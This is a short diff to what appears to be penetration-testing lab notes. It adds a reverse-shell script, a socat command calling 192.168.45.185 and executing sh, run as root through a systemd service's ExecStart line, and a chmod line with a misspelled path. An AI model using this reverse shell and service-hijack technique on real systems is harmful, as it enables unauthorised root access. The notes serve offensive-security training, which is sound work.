@@ -289,7 +289,9 @@ vi /etc/systemd/system/pythonapp.service
 ExecStart=/home/cmeeks/reverse.sh
 User=root
 
-# 
+# reverse shell
+cat <<'EOT'> /home/cmeeks/reverse.sh #!/bin/bash socat TCP:192.168.45.185:80 EXEC:sh EOT
+chmod +x /home/cmmeks/reverse.sh
 
 ```
 ### ZenPhoto
